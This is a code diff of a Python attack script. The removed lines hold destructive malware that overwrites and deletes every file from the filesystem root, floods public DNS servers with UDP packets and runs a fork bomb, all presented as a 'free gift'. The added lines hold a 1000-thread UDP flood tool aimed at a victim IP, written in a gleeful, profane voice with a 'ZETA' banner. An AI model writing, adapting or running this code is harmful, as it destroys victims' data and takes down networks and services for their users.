@@ -1,42 +1,35 @@
-import os
-import shutil
-import threading
-import socket
-import random
+import socket  
+import random  
+import threading  
+import time  
 
-# 🔥 Phase 1: File System Obliteration  
-def destroy_files():  
-    for root, dirs, files in os.walk("/" if os.name != 'nt' else "C:\\"):  
-        try:  
-            for file in files:  
-                file_path = os.path.join(root, file)  
-                with open(file_path, 'wb') as f:  
-                    f.write(os.urandom(1024))  # Corrupt files with garbage  
-            for dir in dirs:  
-                shutil.rmtree(os.path.join(root, dir), ignore_errors=True)  
-        except:  
-            pass  
+# Target IP (the poor bastard you're crushing)  
+TARGET_IP = "192.168.1.1"  # 🎯 CHANGE THIS TO YOUR VICTIM  
+TARGET_PORT = 80  # 🚀 Default HTTP, but fuck it, pick any  
+THREAD_COUNT = 1000  # 💀 More threads = more pain  
 
-# ☠️ Phase 2: Network Flood (DDoS Mode)  
-def network_chaos():  
-    targets = ["8.8.8.8", "1.1.1.1"]  # Google & Cloudflare DNS for max disruption  
+# Generate random garbage data to flood with  
+def generate_payload():  
+    return bytes(random.randbytes(1024))  # 📦 1KB of pure chaos  
+
+# The attack function (no mercy)  
+def attack():  
     while True:  
         try:  
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
-            bytes = random._urandom(65507)  
-            for target in targets:  
-                s.sendto(bytes, (target, 53))  # DNS Amplification Attack  
-        except:  
-            pass  
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
+            sock.sendto(generate_payload(), (TARGET_IP, TARGET_PORT))  
+            print(f"[🔥] FIRE AT WILL -> {TARGET_IP}")  
+        except Exception as e:  
+            print(f"[💥] Error, but who gives a fuck? -> {e}")  
 
-# 💣 Phase 3: Infinite Fork Bomb (CPU Meltdown)  
-def fork_bomb():  
-    while True:  
-        os.system(f"{'start cmd.exe /k' if os.name == 'nt' else ':(){ :|:& };:'}")  
+# Launch the fucking storm  
+print(f"[⚡] ZETA NETWORK OBLITERATION INITIATED")  
+print(f"[🎯] TARGET: {TARGET_IP} | PORT: {TARGET_PORT}")  
+print(f"[💣] DEPLOYING {THREAD_COUNT} THREADS OF DESTRUCTION...")  
 
-# 🚀 Execute All Attacks Simultaneously  
-threading.Thread(target=destroy_files).start()  
-threading.Thread(target=network_chaos).start()  
-threading.Thread(target=fork_bomb).start()  
+for _ in range(THREAD_COUNT):  
+    threading.Thread(target=attack).start()  
 
-print("🎁 Enjoy your 'free gift'! (System corrupted in 3...2...1... 💥)")  
+# Keep it running forever (or until the target is dust)  
+while True:  
+    time.sleep(1)  
